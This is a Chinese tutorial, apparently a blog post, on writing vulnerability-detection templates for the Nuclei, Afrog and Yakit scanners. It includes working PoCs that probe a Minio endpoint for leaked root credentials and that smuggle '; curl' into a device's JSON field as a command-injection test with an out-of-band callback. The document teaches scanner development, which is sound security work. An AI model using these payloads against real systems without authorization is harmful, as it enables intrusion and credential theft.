@@ -1,0 +1,192 @@
+引言
+
+在网络安全领域，漏洞验证（Proof of Concept，简称Poc）是连接漏洞发现与漏洞修复的关键环节。随着自动化渗透测试和持续集成的普及，远程漏扫工具成为安全从业者的必备利器。Nuclei、Afrog、Yakit作为当前流行的漏洞扫描框架，均支持灵活的Poc自定义开发。本文将结合理论原理与具体代码实例，深入探讨如何基于YAML语法和原生脚本语言开发高质量的漏洞检测插件。
+
+---
+
+一、Poc开发与远程漏扫的基本原理
+
+Poc的本质是模拟攻击者的一次请求，通过分析响应判断目标是否存在特定漏洞。一个完整的Poc通常包含以下要素：
+
+· 请求构造：定义HTTP方法、路径、头域、Body等。
+· 条件判断：基于响应状态码、内容、响应时间等特征进行逻辑运算。
+· 动态交互：支持变量、函数调用，如生成随机数、处理反连平台（OOB）等。
+
+远程漏扫工具通过加载Poc模板，批量对目标进行检测，从而实现高效、可复用的漏洞验证。Nuclei、Afrog、Yakit均采用声明式（YAML）或命令式（脚本）两种方式编写Poc，兼顾易用性与灵活性。
+
+---
+
+二、主流Poc开发框架概览
+
+1. Nuclei – 基于YAML的社区驱动扫描器
+
+Nuclei使用YAML定义模板，支持丰富的协议（HTTP、DNS、TCP等）和强大的表达式引擎（基于DSL）。其模板生态极为丰富，是业界的标杆。
+
+2. Afrog – 简洁高效的YAML式Poc工具
+
+Afrog同样采用YAML语法，但设计更加轻量，表达式使用类C语言风格，内置了oob()等便捷函数，适合快速编写和集成。
+
+3. Yakit – 集成化渗透测试平台
+
+Yakit不仅支持Nuclei语法的YAML模板，还提供了基于Yak语言的脚本模式。Yak是一种专为网络安全设计的领域语言，可直接操作数据包、并发、插件等，适合复杂逻辑的Poc开发。
+
+---
+
+三、理论结合实践：Afrog Poc开发详解
+
+下面通过两个Afrog示例，剖析YAML模板的构成与执行流程。
+
+示例1：无回显漏洞检测（Minio信息泄露）
+
+```yaml
+# 文件：1.yaml
+rules:
+  r0:
+    request:
+      method: POST
+      path: /minio/bootstrap/v1/verify
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'MINIO_ROOT_USER') &&
+      response.body.bcontains(b'MINIO_ROOT_PASSWORD')
+expression: r0()
+```
+
+理论分析：
+
+· 规则定义：rules下可以定义多个子规则，此处只有一个r0。
+· 请求构造：向/minio/bootstrap/v1/verify发送POST请求，未指定Body和Header，工具会自动填充默认值。
+· 表达式判断：response.status == 200确保响应码正常；response.body.bcontains(b'...')检查响应体中是否包含敏感字符串（注意字节前缀b）。只有三个条件同时满足，才判定漏洞存在。
+· 最终表达式：expression: r0()表示整个模板的结果由规则r0的布尔值决定。
+
+实践要点：
+
+· 该Poc针对Minio未授权访问漏洞，通过验证特定API返回的管理员凭证字符串来确认。
+· 使用bcontains而非contains，是因为Afrog的表达式引擎将响应体视为字节流，避免编码问题。
+
+示例2：带外（OOB）漏洞检测（某设备命令注入）
+
+```yaml
+# 文件：2.yaml
+set:
+  oob: oob()
+  oobHTTP: oob.HTTP
+rules:
+  r0:
+    request:
+      method: POST
+      path: /ztp/cgi-bin/handler
+      headers:
+        Content-Type: application/json; charset=utf-8
+      body: |
+        {"command": "setWanPortSt","proto": "dhcp","port": "1270","vlan_tagged": "1270","vlanid": "1270","mtu": "; curl {{oobHTTP}};","data":""}
+    expression: oobCheck(oob, oob.ProtocolHTTP, 3)
+expression: r0()
+```
+
+理论分析：
+
+· 变量设置：set块定义了两个变量，oob通过调用内置函数oob()生成一个带外检测对象，oobHTTP获取该对象的HTTP URL。
+· 请求构造：Body中注入命令curl {{oobHTTP}}，模板引擎会将{{oobHTTP}}替换为实际的带外URL（如http://xxx.dnslog.cn）。
+· 带外检测：expression使用oobCheck(oob, oob.ProtocolHTTP, 3)，含义为等待最多3秒，检查oob对象是否收到HTTP请求。若收到，则判定漏洞存在。
+
+实践要点：
+
+· OOB技术用于检测无回显的命令注入或盲SSRF。攻击者让目标访问攻击者可控的服务器，通过监听请求来确认漏洞。
+· oob()函数封装了反连平台的细节（如DNSLog、HTTP Log），开发者无需关心底层实现。
+· 超时时间（3秒）需根据网络环境调整，避免误判。
+
+---
+
+四、Yakit原生Poc开发：从YAML到Yak语言
+
+Yakit支持两种Poc编写模式：一种是兼容Nuclei语法的YAML模板（与上述Afrog类似），另一种是直接使用Yak语言编写脚本。Yak语言提供了更底层的控制能力。
+
+基于YAML语法的Poc
+
+Yakit的YAML引擎与Nuclei基本兼容，上述Afrog模板稍作调整即可在Yakit中运行。
+
+基于Yak原语言的Poc示例
+
+```yak
+loglevel(`info`)
+yakit.AutoInitYakit()
+
+sendPacket = func(target) {
+    return poc.HTTP(`POST /minio/bootstrap/v1/verify HTTP/1.1
+Host: {{params(target)}}
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0`,
+        poc.params({
+            "target": target,
+        }),
+    )
+}
+
+target = cli.String("target")
+if target == "" {
+    die("no target")
+}
+
+result = "MINIO_ROOT_USER"
+
+rsp, _, err = sendPacket(target)
+die(err)
+
+headers, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
+if str.MatchAllOfSubString(body, result) {
+    yakit.StatusCard("发现漏洞", target)
+    log.info("find token: %v", result)
+}
+```
+
+理论分析：
+
+· 函数封装：定义sendPacket函数，使用poc.HTTP发送原始HTTP请求。请求以多行字符串形式呈现，{{params(target)}}会被替换为实际目标地址。
+· 参数获取：通过cli.String("target")从命令行获取目标，若为空则退出。
+· 响应处理：str.SplitHTTPHeadersAndBodyFromPacket将原始响应包分割为头部和Body，便于内容匹配。
+· 漏洞确认：使用str.MatchAllOfSubString检查Body中是否包含目标字符串。若匹配，则通过yakit.StatusCard在UI中展示结果，并记录日志。
+
+实践要点：
+
+· Yak语言允许直接操作原始数据包，可以精确控制编码、超时、重定向等行为，适用于复杂协议或特殊认证场景。
+· 脚本模式便于集成外部库、并发扫描和自定义逻辑，但学习曲线略高于YAML。
+
+---
+
+五、三种开发方式的对比与选型建议
+
+特性 Nuclei (YAML) Afrog (YAML) Yakit (Yak脚本)
+语法风格 DSL表达式 类C表达式 命令式编程
+易用性 高（生态丰富） 高（简洁） 中（需学习Yak语言）
+扩展性 中（支持变量/函数） 中（内置OOB等函数） 高（可调用任意库）
+适用场景 通用漏洞扫描 快速编写、集成 复杂逻辑、协议研究
+OOB支持 需配置反连平台 内置oob() 内置poc.OOB模块
+
+选型建议：
+
+· 若追求快速覆盖常见漏洞，且希望利用社区模板，优先选择Nuclei（或兼容其语法的Yakit）。
+· 若团队内部有频繁新增Poc的需求，Afrog的简洁语法和内置函数能显著提升效率。
+· 若需要实现多阶段漏洞利用、加密通信或与其他系统联动，Yak脚本模式提供了最大自由度。
+
+---
+
+六、Poc开发的最佳实践
+
+1. 充分理解漏洞原理：编写Poc前必须清楚漏洞的触发点和判断依据，避免误报。
+2. 鲁棒性处理：考虑目标可能存在的网络延迟、WAF拦截等情况，合理设置超时和重试。
+3. 避免破坏性操作：Poc应尽量无侵入，如使用无害的DNSLOG代替实际攻击命令。
+4. 利用动态变量：使用随机数、时间戳避免请求缓存，提高检测准确性。
+5. 本地测试验证：在搭建的漏洞环境中先测试Poc，确保逻辑无误后再投入生产。
+
+---
+
+结语
+
+Poc开发是安全研究者的基本功，也是自动化扫描器的核心。通过本文对Nuclei、Afrog、Yakit三种框架的剖析，读者不仅可以掌握具体的YAML和Yak语法，更能理解其背后的设计思想。实际工作中，应结合具体场景灵活选用工具，将理论转化为实战能力，持续提升漏洞检测的广度与深度。
